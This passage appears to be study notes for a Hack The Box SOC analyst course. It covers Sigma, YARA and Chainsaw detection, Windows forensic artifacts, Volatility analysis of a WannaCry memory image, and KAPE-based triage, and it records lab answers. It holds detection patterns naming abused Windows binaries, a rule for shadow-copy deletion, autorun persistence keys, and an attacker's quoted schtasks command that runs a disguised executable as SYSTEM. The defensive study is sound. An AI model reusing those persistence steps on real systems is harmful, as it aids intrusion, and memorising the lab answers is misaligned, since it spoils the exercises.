Image=\"*\\\\cmd.exe\" OR Image=\"*\\\\mshta.exe\" OR Image=\"*\\\\cscript.exe\" OR Image=\"*\\\\wscript.exe\" OR Image=\"*\\\\taskkill.exe\" OR Image=\"*\\\\regsvr32.exe\" OR Image=\"*\\\\rundll32.exe\" OR Image=\"*\\\\calc.exe\"))\n</code></pre> <p>Q: Using sigmac translate the \"C:\\Rules\\sigma\\file_event_win_app_dropping_archive.yml\" Sigma rule into the equivalent Splunk search. Then, navigate to http://[Target IP]:8000, open the \"Search &amp; Reporting\" application, and submit the Splunk search sigmac provided. Enter the TargetFilename value of the returned event as your answer.</p> <pre><code>python sigmac -t splunk C:\\Rules\\sigma\\file_event_win_app_dropping_archive.yml -c .\\config\\splunk-windows.yml\n\n((Image=\"*\\\\winword.exe\" OR Image=\"*\\\\excel.exe\" OR Image=\"*\\\\powerpnt.exe\" OR Image=\"*\\\\msaccess.exe\" OR Image=\"*\\\\mspub.exe\" OR Image=\"*\\\\eqnedt32.exe\" OR Image=\"*\\\\visio.exe\" OR Image=\"*\\\\wordpad.exe\" OR Image=\"*\\\\wordview.exe\" OR Image=\"*\\\\certutil.exe\" OR Image=\"*\\\\certoc.exe\" OR Image=\"*\\\\CertReq.exe\" OR Image=\"*\\\\Desktopimgdownldr.exe\" OR Image=\"*\\\\esentutl.exe\" OR Image=\"*\\\\finger.exe\" OR Image=\"*\\\\notepad.exe\" OR Image=\"*\\\\AcroRd32.exe\" OR Image=\"*\\\\RdrCEF.exe\" OR Image=\"*\\\\mshta.exe\" OR Image=\"*\\\\hh.exe\" OR Image=\"*\\\\sharphound.exe\") (TargetFilename=\"*.zip\" OR TargetFilename=\"*.rar\" OR TargetFilename=\"*.7z\" OR TargetFilename=\"*.diagcab\" OR TargetFilename=\"*.appx\"))\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#skills-assessment_1", "title": "Skills Assessment", "text": "<p>Q1: The \"C:\\Rules\\yara\\seatbelt.yar\" YARA rule aims to detect instances of the \"Seatbelt.exe\" .NET assembly on disk. Analyze both \"C:\\Rules\\yara\\seatbelt.yar\" and \"C:\\Samples\\YARASigma\\Seatbelt.exe\" and specify the appropriate string inside the \"$class2\" variable so that the rule successfully identifies \"C:\\Samples\\YARASigma\\Seatbelt.exe\". Answer format: L__r</p> <pre><code># seatbelt.yar\nrule seatbelt_detected {\n meta:\n   description = \"Rule for detecting Seatbelt\"\n   author = \"Dimitrios Bougioukas\"\n strings:\n   $class1 = \"WMIUtil\"\n   $class2 = \"LsaWrapper\"\n   $class3 = \"SecurityUtil\"\n   $class4 = \"MiscUtil\"\n   $dotnetMagic = \"BSJB\" ascii\n condition:\n   (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and $dotnetMagic and 4 of them\n}\n</code></pre> <p></p> <p>Q2: Use Chainsaw with the \"C:\\Tools\\chainsaw\\sigma\\rules\\windows\\powershell\\powershell_script\\posh_ps_susp_win32_shadowcopy.yml\" Sigma rule to hunt for shadow volume deletion inside \"C:\\Events\\YARASigma\\lab_events_6.evtx\". Enter the identified ScriptBlock ID as your answer.</p> <pre><code># powershell_script\\posh_ps_susp_win32_shadowcopy.yml\ntitle: Delete Volume Shadow Copies via WMI with PowerShell - PS Script\nid: e17121b4-ef2a-4418-8a59-12fb1631fa9e\nstatus: test\ndescription: Deletes Windows Volume Shadow Copies with PowerShell code and Get-WMIObject. This technique is used by numerous ransomware families such as Sodinokibi/REvil\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1490/T1490.md#atomic-test-5---windows---delete-volume-shadow-copies-via-wmi-with-powershell\nauthor: frack113\ndate: 2021/12/26\nmodified: 2022/12/02\ntags:\n    - attack.impact\n    - attack.t1490\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - 'Get-WmiObject'\n            - 'Win32_Shadowcopy'\n            - '.Delete()'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n</code></pre> <pre><code>.\\chainsaw_x86_64-pc-windows-msvc.exe hunt C:\\Events\\YARASigma\\lab_events_6.evtx -s C:\\Tools\\chainsaw\\sigma\\rules\\windows\\powershell\\powershell_script\\posh_ps_susp_win32_shadowcopy.yml --mapping .\\mappings\\sigma-event-logs-all-new.yml\n</code></pre> <p></p>"}, {"location": "HTB/Academy/SOC%20Analyst/#introduction-to-digital-forensics", "title": "Introduction to Digital Forensics", "text": "<p>The basic steps for performing a forensic investigation are as follows:</p> <ol> <li> <p>Create a Forensic Image</p> </li> <li> <p>Document the System's State</p> </li> <li> <p>Identify and Preserve Evidence</p> </li> <li> <p>Analyze the Evidence</p> </li> <li> <p>Timeline Analysis</p> </li> <li> <p>Identify Indicators of Compromise (IOCs)</p> </li> <li> <p>Report and Documentation</p> </li> </ol>"}, {"location": "HTB/Academy/SOC%20Analyst/#windows-forensics-overview", "title": "Windows Forensics Overview", "text": "<p>NTFS (New Technology File System) </p> <p>Here are some of the key forensic artifacts that digital investigators often analyze when working with NTFS file systems:</p> <p><code>File Metadata:</code> NTFS stores extensive metadata for each file, including creation time, modification time, access time, and attribute information (such as read-only, hidden, or system file attributes). Analyzing these timestamps can help establish timelines and reconstruct user activities.</p> <p><code>MFT Entries:</code> The Master File Table (MFT) is a crucial component of NTFS that stores metadata for all files and directories on a volume. Examining MFT entries provides insights into file names, sizes, timestamps, and data storage locations. When files are deleted, their MFT entries are marked as available, but the data may remain on the disk until overwritten.</p> <p>F<code>ile Slack and Unallocated Space:</code> Unallocated space on an NTFS volume may contain remnants of deleted files or fragments of data. File slack refers to the unused portion of a cluster that may contain data from a previous file. Digital forensic tools can help recover and analyze data from these areas.</p> <p><code>File Signatures:</code> File headers and signatures can be useful in identifying file types even when file extensions have been changed or obscured. This information is critical for reconstructing the types of files present on a system.</p> <p><code>USN Journal:</code> The Update Sequence Number (USN) Journal is a log maintained by NTFS to record changes made to files and directories. Forensic investigators can analyze the USN Journal to track file modifications, deletions, and renames.</p> <p><code>LNK Files:</code> Windows shortcut files (LNK files) contain information about the target file or program, as well as timestamps and metadata. These files can provide insights into recently accessed files or executed programs.</p> <p><code>Prefetch Files:</code> Prefetch files are generated by Windows to improve the startup performance of applications. These files can indicate which programs have been run on the system and when they were last executed.</p> <p><code>Registry Hives:</code> While not directly related to the file system, Windows Registry hives contain important configuration and system information. Malicious activities or unauthorized changes can leave traces in the registry, which forensic investigators analyze to understand system modifications.</p> <p><code>Shellbags:</code> Shellbags are registry entries that store folder view settings, such as window positions and sorting preferences. Analyzing shellbags can reveal user navigation patterns and potentially identify accessed folders.</p> <p><code>Thumbnail Cache:</code> Thumbnail caches store miniature previews of images and documents. These caches can reveal files that were recently viewed, even if the original files have been deleted.</p> <p><code>Recycle Bin:</code> The Recycle Bin contains files that have been deleted from the file system. Analyzing the Recycle Bin can help recover deleted files and provide insights into user actions.</p> <p><code>Alternate Data Streams (ADS):</code> ADS are additional streams of data associated with files. Malicious actors may use ADS to hide data, and forensic investigators need to examine these streams to ensure a comprehensive analysis.</p> <p><code>Volume Shadow Copies:</code> NTFS supports Volume Shadow Copies, which are snapshots of the file system at different points in time. These copies can be valuable for data recovery and analysis of changes made over time.</p> <p><code>Security Descriptors and ACLs:</code> Access Control Lists (ACLs) and security descriptors determine file and folder permissions. Analyzing these artifacts helps understand user access rights and potential security breaches.</p> Artifact Location/Registry Key Data Stored Prefetch Files C:\\Windows\\Prefetch Metadata about executed applications (file paths, timestamps, execution count) Shimcache Registry: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache Program execution details (file paths, timestamps, flags) Amcache C:\\Windows\\AppCompat\\Programs\\Amcache.hve (Binary Registry Hive) Application details (file paths, sizes, digital signatures, timestamps) UserAssist Registry: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist Executed program details (application names, execution counts, timestamps) RunMRU Lists Registry: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU Recently executed programs and their command lines Jump Lists User-specific folders (e.g., %AppData%\\Microsoft\\Windows\\Recent) Recently accessed files, folders, and tasks associated with applications Shortcut (LNK) Files Various locations (e.g., Desktop, Start Menu) Target executable, file paths, timestamps, user interactions Recent Items User-specific folders (e.g., %AppData%\\Microsoft\\Windows\\Recent) Recently accessed files Windows Event Logs C:\\Windows\\System32\\winevt\\Logs Various event logs containing process creation, termination, and other events <p>The Windows <code>Registry</code> acts as a crucial database, storing critical system settings for the Windows OS.</p> <p>Example of <code>Autorun</code> keys used for persistence:</p> <p>Run/RunOnce Keys</p> <pre><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\\n</code></pre> <p>Keys used by WinLogon Process</p> <pre><code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell\n</code></pre> <p>Startup Keys</p> <pre><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User\n</code></pre> <p>SRUM</p> <p>Switching gears to SRUM (System Resource Usage Monitor), it's a feature introduced in Windows 8 and subsequent versions.</p>"}, {"location": "HTB/Academy/SOC%20Analyst/#evidence-acquisition-techniques-tools", "title": "Evidence Acquisition Techniques &amp; Tools", "text": "<p>Here's an overview of evidence acquisition techniques commonly used in digital forensics:</p> <pre><code>Forensic Imaging\nExtracting Host-based Evidence &amp; Rapid Triage\nExtracting Network Evidence\n</code></pre> <p>Forensic Imaging</p> <p>Below are some forensic imaging tools and solutions:</p> <ul> <li> <p>FTK Imager: Developed by AccessData (now acquired by Exterro), FTK Imager is one of the most widely used disk imaging tools in the cybersecurity field. It allows us to create perfect copies (or images) of computer disks for analysis, preserving the integrity of the evidence. It also lets us view and analyze the contents of data storage devices without altering the data.</p> </li> <li> <p>AFF4 Imager: A free, open-source tool crafted for creating and duplicating forensic disk images. It's user-friendly and compatible with numerous file systems. A benefit of the AFF4 Imager is its capability to extract files based on their creation time, segment volumes, and reduce the time taken for imaging through compression.</p> </li> <li> <p>DD and DCFLDD: Both are command-line utilities available on Unix-based systems (including Linux and MacOS). DD is a versatile tool included in most Unix-based systems by default, while DCFLDD is an enhanced version of DD with features specifically useful for forensics, such as hashing.</p> </li> <li> <p>Virtualization Tools: Given the prevalent use of virtualization in modern systems, incident responders will often need to collect evidence from virtual environments. Depending on the specific virtualization solution, evidence can be gathered by temporarily halting the system and transferring the directory that houses it. Another method is to utilize the snapshot capability present in numerous virtualization software tools.</p> </li> </ul> <p>Utilizing Arsenal Image Mounter to mount a disk image we have previously created (not the one mentioned above) from a compromised Virtual Machine (VM) running on VMWare. The virtual hard disk of the VM has been stored as <code>HTBVM01-000003.vmdk</code>.</p> <p>Extracting Host-based Evidence &amp; Rapid Triage</p> <ul> <li>Host-based Evidence</li> </ul> <p>To capture memory, tools like FTK Imager are commonly employed.</p> <p>Some other memory acquisition solutions are:</p> <p>WinPmem: WinPmem has been the default open source memory acquisition driver for windows for a long time. It used to live in the Rekall project, but has recently been separated into its own repository.</p> <p>DumpIt: A simplistic utility that generates a physical memory dump of Windows and Linux machines. On Windows, it concatenates 32-bit and 64-bit system physical memory into a single output file, making it extremely easy to use.</p> <p>MemDump: MemDump is a free, straightforward command-line utility that enables us to capture the contents of a system's RAM. It\u2019s quite beneficial in forensics investigations or when analyzing a system for malicious activity. Its simplicity and ease of use make it a popular choice for memory acquisition.</p> <p>Belkasoft RAM Capturer: This is another powerful tool we can use for memory acquisition, provided free of charge by Belkasoft. It can capture the RAM of a running Windows computer, even if there's active anti-debugging or anti-dumping protection. This makes it a highly effective tool for extracting as much data as possible during a live forensics investigation.</p> <p>Magnet RAM Capture: Developed by Magnet Forensics, this tool provides a free and simple way to capture the volatile memory of a system.</p> <p>LiME (Linux Memory Extractor): LiME is a Loadable Kernel Module (LKM) which allows the acquisition of volatile memory. LiME is unique in that it's designed to be transparent to the target system, evading many common anti-forensic measures.</p> <ul> <li>Rapid Triage</li> </ul> <p>This approach emphasizes collecting data from potentially compromised systems. The goal is to centralize high-value data, streamlining its indexing and analysis. By centralizing this data, analysts can more effectively deploy tools and techniques, honing in on systems with the most evidentiary value. This targeted approach allows for a deeper dive into digital forensics, offering a clearer picture of the adversary's actions.</p> <p>One of the best, if not the best, rapid artifact parsing and extraction solutions is KAPE (Kroll Artifact Parser and Extractor). </p> <p>Velociraptor is a potent tool for gathering host-based information using Velociraptor Query Language (VQL) queries. Beyond this, Velociraptor can execute <code>Hunts</code> to amass various artifacts. A frequently utilized artifact is the <code>Windows.KapeFiles.Targets</code>. While KAPE (Kroll Artifact Parser and Extractor) itself isn't open-source, its file collection logic, encoded in YAML, is accessible via the KapeFiles project. This approach is a staple in Rapid Triage.</p> <p>Extracting Network Evidence</p> <p>First up, our Intro to Network Traffic Analysis and Intermediate Network Traffic Analysis modules covered traffic capture analysis. Think of traffic capture as a snapshot of all the digital conversations happening in our network. Tools like <code>Wireshark</code> or <code>tcpdump</code> allow us to capture and dissect these packets, giving us a granular view of data in transit.</p> <p>Then, our Working with <code>IDS/IPS</code> and Detecting Windows Attacks with Splunk modules covered the usage of IDS/IPS-derived data. Intrusion Detection Systems (IDS) are our watchful sentinels, constantly monitoring network traffic for signs of malicious activity. When they spot something amiss, they alert us. On the other hand, Intrusion Prevention Systems (IPS) take it a step further. Not only do they detect, but they also take pre-defined actions to block or prevent those malicious activities.</p> <p>Traffic flow data, often sourced from tools like NetFlow or sFlow, provides us with a broader view of our network's behavior. While it might not give us the nitty-gritty details of each packet, it offers a high-level overview of traffic patterns.</p> <p>Lastly, our trusty <code>firewalls</code>. These are not just barriers that block or allow traffic based on predefined rules. Modern firewalls are intelligent beasts. They can identify applications, users, and even detect and block threats. By analyzing firewall logs, we can uncover attempts to exploit vulnerabilities, unauthorized access attempts, and other malicious activities.</p> <p>Q: Visit the URL \"https://127.0.0.1:8889/app/index.html#/search/all\" and log in using the credentials: admin/password. After logging in, click on the circular symbol adjacent to \"Client ID\". Subsequently, select the displayed \"Client ID\" and click on \"Collected\". Initiate a new collection and gather artifacts labeled as \"Windows.KapeFiles.Targets\" using the _SANS_Triage configuration. Lastly, examine the collected artifacts and enter the name of the scheduled task that begins with 'A' and concludes with 'g' as your answer.</p> <pre><code> C:\\Windows\\System32\\Tasks \n\n Get-ChildItem -Path \"C:\\Users\\Administrator\\Downloads\\E-CORP-C.e0967723979c1134-F.CU8021N32BD00\\results\" -Recurse | Select-String -Pattern \"System32\\\\\\\\Tasks\" | ForEach-Object {\n    [PSCustomObject]@{\n        FilePath = $_.Path\n        LineNumber = $_.LineNumber\n        LineContent = $_.Line\n    }\n}\n</code></pre> <p> AutorunsToWinEventLog</p>"}, {"location": "HTB/Academy/SOC%20Analyst/#memory-forensics", "title": "Memory Forensics", "text": "<p>Here are some types of data found in RAM that are valuable for incident investigation:</p> <pre><code>Network connections\nFile handles and open Files\nOpen registry keys\nRunning processes on the system\nLoaded modules\nLoaded device drivers\nCommand history and console sessions\nKernel data structures\nUser and credential information\nMalware artifacts\nSystem configuration\nProcess memory regions\n</code></pre> <p>The preferred tool for conducting memory forensics is Volatility. Volatility is a leading open-source memory forensics framework.</p> <p>Some commonly used Volatility modules include:</p> <pre><code>pslist: Lists the running processes.\ncmdline: Displays process command-line arguments\nnetscan: Scans for network connections and open ports.\nmalfind: Scans for potentially malicious code injected into processes.\nhandles: Scans for open handles\nsvcscan: Lists Windows services.\ndlllist: Lists loaded DLLs (Dynamic-link Libraries) in a process.\nhivelist: Lists the registry hives in memory.\n</code></pre> <p>Volatility offers extensive documentation. You can find modules and their associated documentation using the following links:</p> <p>Volatility v2: https://github.com/volatilityfoundation/volatility/wiki/Command-Reference</p> <p>Volatility v3: https://volatility3.readthedocs.io/en/latest/index.html</p> <p>A useful Volatility (v2 &amp; v3) cheatsheet can be found here: https://blog.onfvp.com/post/volatility-cheatsheet/</p> <p>Volatility v2 Fundamentals</p> <ol> <li>Identifying the Profile</li> </ol> <p><code>$ vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem imageinfo</code></p> <ol> <li>Identifying Running Processes</li> </ol> <p><code>$ vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem --profile=Win7SP1x64 pslist</code></p> <ol> <li>Identifying Network Artifacts</li> </ol> <p><code>$ vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem --profile=Win7SP1x64 netscan</code></p> <p>To find <code>_TCPT_OBJECT</code> structures using pool tag scanning, use the <code>connscan</code> command.</p> <ol> <li>Identifying Injected Code</li> </ol> <p><code>$ vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem --profile=Win7SP1x64 malfind --pid=608</code></p> <ol> <li>Identifying Handles</li> </ol> <p>The <code>handles</code> plugin in Volatility is used for analyzing the handles (file and object references) held by a specific process within a memory dump. </p> <p><code>$ vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem --profile=Win7SP1x64 handles -p 1512 --object-type=Key</code></p> <p><code>$ vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem --profile=Win7SP1x64 handles -p 1512 --object-type=File</code></p> <p><code>$ vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem --profile=Win7SP1x64 handles -p 1512 --object-type=Process</code></p> <ol> <li>Identifying Windows Services</li> </ol> <p>The <code>svcscan</code> plugin in Volatility is used for listing and analyzing Windows services running on a system within a memory dump.</p> <p><code>$ vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem --profile=Win7SP1x64 svcscan | more</code></p> <ol> <li>Identifying Loaded DLLs</li> </ol> <p><code>$ vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem --profile=Win7SP1x64 dlllist -p 1512</code></p> <ol> <li>Identifying Hives</li> </ol> <p><code>$ vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem --profile=Win7SP1x64 hivelist</code></p> <p>Rootkit Analysis with Volatility v2</p> <p>EPROCESS is a data structure in the Windows kernel that represents a process. Each running process in the Windows operating system has a corresponding EPROCESS block in kernel memory. During memory analysis, the examination of EPROCESS structures is crucial for understanding the running processes on a system, identifying parent-child relationships, and determining which processes were active at the time of the memory capture.</p> <p>The <code>psscan</code> plugin is used to enumerate running processes.</p> <p><code>$ vol.py -f /home/htb-student/MemoryDumps/rootkit.vmem psscan</code></p> <p>In the output below, we can see that the <code>pslist</code> plugin could not find <code>test.exe</code> which was hidden by a rootkit, but the <code>psscan</code> plugin was able to find it.</p> <p>Memory Analysis Using Strings</p> <ol> <li>Identifying IPv4 Addresses</li> </ol> <p><code>$ strings /home/htb-student/MemoryDumps/Win7-2515534d.vmem | grep -E \"\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\"</code></p> <ol> <li>Identifying Email Addresses</li> </ol> <p><code>$ strings /home/htb-student/MemoryDumps/Win7-2515534d.vmem | grep -oE \"\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,4}\\b\"</code></p> <ol> <li>Identifying Command Prompt or PowerShell Artifacts</li> </ol> <p><code>$ strings /home/htb-student/MemoryDumps/Win7-2515534d.vmem | grep -E \"(cmd|powershell|bash)[^\\s]+\"</code></p> <p>Q1: Examine the file \"/home/htb-student/MemoryDumps/Win7-2515534d.vmem\" with Volatility. Enter the parent process name for @WanaDecryptor (Pid 1060) as your answer. Answer format: _.exe</p> <pre><code>$ /usr/local/bin/vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem imageinfo\n\n$ /usr/local/bin/vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem --profile=Win7SP1x64 pslist -p 1060\n\n$ /usr/local/bin/vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem --profile=Win7SP1x64 pslist -p 1792\n</code></pre> <p>Q2: Examine the file \"/home/htb-student/MemoryDumps/Win7-2515534d.vmem\" with Volatility. tasksche.exe (Pid 1792) has multiple file handles open. Enter the name of the suspicious-looking file that ends with .WNCRYT as your answer. Answer format: _.WNCRYT</p> <pre><code>$ /usr/local/bin/vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem --profile=Win7SP1x64 handles -p 1792 --object-type=Key\n\n$ /usr/local/bin/vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem --profile=Win7SP1x64 handles -p 1792 --object-type=File\nhibsys.WNCRYT\n\n$ /usr/local/bin/vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem --profile=Win7SP1x64 handles -p 1792 --object-type=Process\n</code></pre> <p>Q3: Examine the file \"/home/htb-student/MemoryDumps/Win7-2515534d.vmem\" with Volatility. Enter the Pid of the process that loaded zlib1.dll as your answer.</p> <pre><code>$ vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem --profile=Win7SP1x64 dlllist\n\n$ vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem --profile=Win7SP1x64 dlllist -p 3012\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#disk-forensics", "title": "Disk Forensics", "text": "<p>Enter Autopsy: a user-friendly forensic platform built atop the open-source Sleuth Kit toolset. It mirrors many features you'd find in its commercial counterparts: timeline assessments, keyword hunts, web and email artifact retrievals, and the ability to sift results based on known malicious file hashes.</p>"}, {"location": "HTB/Academy/SOC%20Analyst/#rapid-triage-examination-analysis-tools", "title": "Rapid Triage Examination &amp; Analysis Tools", "text": "<p>Eric Zimmerman's forensic tools: https://ericzimmerman.github.io/#!index.md</p> <p>MAC(b) Times in NTFS</p> <p>The term <code>MAC(b)</code> times denotes a series of timestamps linked to files or objects. These timestamps are pivotal as they shed light on the chronology of events or actions on a file system. The acronym <code>MAC(b)</code> is an abbreviation for <code>Modified, Accessed, Changed, and (b) Birth</code> times. The inclusion of <code>b</code> signifies the <code>Birth timestamp</code>, which isn't universally present across all file systems or easily accessible via standard Windows API functions. Let's delve deeper into the nuances of <code>MACB</code> timestamps.</p> <p>General Rules for Timestamps in the Windows NTFS File System</p> Operation Modified Accessed Birth (Created) File Create Yes Yes Yes File Modify Yes No No File Copy No (Inherited) Yes Yes File Access No No* No <p>All these timestamps reside in the <code>$MFT</code> file, located at the root of the system drive. </p> <p>These timestamps are housed within the $MFT across two distinct attributes:</p> <p><code>$STANDARD_INFORMATION</code></p> <p><code>$FILE_NAME</code></p> <p>Structure of MFT File Record</p> <p></p> <p><code>Get-Item * -Stream Zone.Identifier -ErrorAction SilentlyContinue</code></p> <p><code>Get-Content * -Stream Zone.Identifier -ErrorAction SilentlyContinue</code></p> <p>Q1: During our examination of the USN Journal within Timeline Explorer, we observed \"uninstall.exe\". The attacker subsequently renamed this file. Use Zone.Identifier information to determine its new name and enter it as your answer.</p> <pre><code>.\\MFTECmd.exe -f 'C:\\Users\\johndoe\\Desktop\\forensic_data\\kape_output\\D\\$Extend\\$J' --csv C:\\Users\\johndoe\\Desktop\\forensic_data\\mft_analysis\\ --csvf MFT-J.csv\n\n.\\MFTECmd.exe -f 'C:\\Users\\johndoe\\Desktop\\forensic_data\\kape_output\\D\\$MFT' --csv C:\\Users\\johndoe\\Desktop\\forensic_data\\mft_analysis\\ --csvf MFT.csv\n\nZone Id Contents\n\"[ZoneTransfer]\nZoneId=3\nReferrerUrl=http://10.10.10.10:443/\nHostUrl=http://10.10.10.10:443/uninstall.exe\n\"\n</code></pre> <p>Filter Zone Id Contents contain 3, and find the entry number 90469 which is <code>microsoft.windowskits.feedback.exe</code></p> <p></p> <p>Q2: Review the file at \"C:\\Users\\johndoe\\Desktop\\forensic_data\\kape_output\\D\\Windows\\System32\\winevt\\logs\\Microsoft-Windows-Sysmon%4Operational.evtx\" using Timeline Explorer. It documents the creation of two scheduled tasks. Enter the name of the scheduled task that begins with \"M\" and concludes with \"r\" as your answer.</p> <pre><code>.\\EvtxECmd.exe --sync\n\n.\\EvtxECmd.exe -f \"C:\\Users\\johndoe\\Desktop\\forensic_data\\kape_output\\D\\Windows\\System32\\winevt\\logs\\Microsoft-Windows-Sysmon%4Operational.evtx\" --csv \"C:\\Users\\johndoe\\Desktop\\forensic_data\\event_logs\\csv_timeline\" --csvf kape_event_log.csv\n\nExecutable Info\nschtasks  /Create /TN \"Microsoft-Windows-DiagnosticDataCollector\" /TR \"C:\\Windows\\Tasks\\microsoft.windowskits.feedback.exe\" /SC DAILY /ST 12:00 /RL HIGHEST /F /RU SYSTEM\n</code></pre> <p>Filter payload contains <code>schtasks</code></p> <p>Q3:  Examine the contents of the file located at \"C:\\Users\\johndoe\\Desktop\\forensic_data\\APMX64\\discord.apmx64\" using API Monitor. \"discord.exe\" performed process injection against another process as well. Identify its name and enter it as your answer.</p> <p></p>"}, {"location": "HTB/Academy/SOC%20Analyst/#practical-digital-forensics-scenario", "title": "Practical Digital Forensics Scenario", "text": "<p>Memory Analysis with Volatility v3</p> <ul> <li>Identifying the Memory Dump's Profile</li> </ul> <p><code>python vol.py -q -f ..\\memdump\\PhysicalMemory.raw windows.info</code></p> <ul> <li>Identifying Injected Code</li> </ul> <p><code>python vol.py -q -f ..\\memdump\\PhysicalMemory.raw windows.malfind</code></p> <ul> <li>Identifying Running Processes</li> </ul> <p><code>python vol.py -q -f ..\\memdump\\PhysicalMemory.raw windows.pslist</code></p> <p><code>python vol.py -q -f ..\\memdump\\PhysicalMemory.raw windows.pstree</code></p> <ul> <li>Identifying Process Command Lines</li> </ul> <p><code>python vol.py -q -f ..\\memdump\\PhysicalMemory.raw windows.cmdline</code></p> <p>Dumping Process Memory &amp; Leveraging YARA</p> <pre><code>python vol.py -q -f ..\\memdump\\PhysicalMemory.raw windows.memmap --pid 3648 --dump\n\nPS C:\\Users\\johndoe&gt; $rules = Get-ChildItem C:\\Users\\johndoe\\Desktop\\yara-4.3.2-2150-win64\\rules | Select-Object -Property Name\n\nPS C:\\Users\\johndoe&gt; foreach ($rule in $rules) {C:\\Users\\johndoe\\Desktop\\yara-4.3.2-2150-win64\\yara64.exe C:\\Users\\johndoe\\Desktop\\yara-4.3.2-2150-win64\\rules\\$($rule.Name) C:\\Users\\johndoe\\Desktop\\pid.3648.dmp}\n</code></pre> <ul> <li>Identifying Loaded DLLs</li> </ul> <p><code>python vol.py -q -f ..\\memdump\\PhysicalMemory.raw windows.dlllist --pid 3648</code></p> <ul> <li>Identifying Handles</li> </ul> <p><code>python vol.py -q -f ..\\memdump\\PhysicalMemory.raw windows.handles --pid 3648</code></p> <ul> <li>Identifying Network Artifacts</li> </ul> <p><code>python vol.py -q -f ..\\memdump\\PhysicalMemory.raw windows.netstat</code></p> <p><code>python vol.py -q -f ..\\memdump\\PhysicalMemory.raw windows.netscan</code></p> <p>Disk Image/Rapid Triage Data Examination &amp; Analysis</p> <p>Extracting Cobalt Strike Beacon Configuration</p> <p><code>python parse_beacon_config.py E:\\payload.dll</code></p> <p>Analyzing Rapid Triage Data - Windows Event Logs (Chainsaw)</p> <p><code>chainsaw_x86_64-pc-windows-msvc.exe hunt \"..\\kapefiles\\auto\\C%3A\\Windows\\System32\\winevt\\Logs\" -s sigma/ --mapping mappings/sigma-event-logs-all.yml -r rules/ --csv --output output_csv</code></p> <p>Q1: Extract and scrutinize the memory content of the suspicious PowerShell process which corresponds to PID 6744. Determine which tool from the PowerSploit repository (accessible at https://github.com/PowerShellMafia/PowerSploit) has been utilized within the process, and enter its name as your answer.</p> <p><code>PowerView</code></p> <pre><code>python vol.py -q -f ..\\memdump\\PhysicalMemory.raw windows.memmap --pid 6744 --dump\n\nPS C:\\Users\\johndoe&gt; $rules = Get-ChildItem C:\\Users\\johndoe\\Desktop\\yara-4.3.2-2150-win64\\rules | Select-Object -Property Name\n\nforeach ($rule in $rules) {C:\\Users\\johndoe\\Desktop\\yara-4.3.2-2150-win64\\yara64.exe C:\\Users\\johndoe\\Desktop\\yara-4.3.2-2150-win64\\rules\\$($rule.Name) C:\\Users\\johndoe\\Desktop\\pid.6744.dmp}\n</code></pre> <p>Q2: Investigate the USN Journal located at \"C:\\Users\\johndoe\\Desktop\\kapefiles\\ntfs\\%5C%5C.%5CC%3A\\$Extend\\$UsnJrnl%3A$J\" to determine how \"advanced_ip_scanner.exe\" was introduced to the compromised system. Enter the name of the associated process as your answer. Answer format: _.exe</p> <p><code>rundl32.exe</code></p> <p>Use Autopsy, timeline-&gt;List</p> <pre><code>python C:\\Users\\johndoe\\Desktop\\files\\USN-Journal-Parser-master\\usnparser\\usn.py -f 'C:\\Users\\johndoe\\Desktop\\kapefiles\\ntfs\\%5C%5C.%5CC%3A\\$Extend\\$UsnJrnl%3A$J' -o C:\\Users\\johndoe\\Desktop\\usn_output.csv 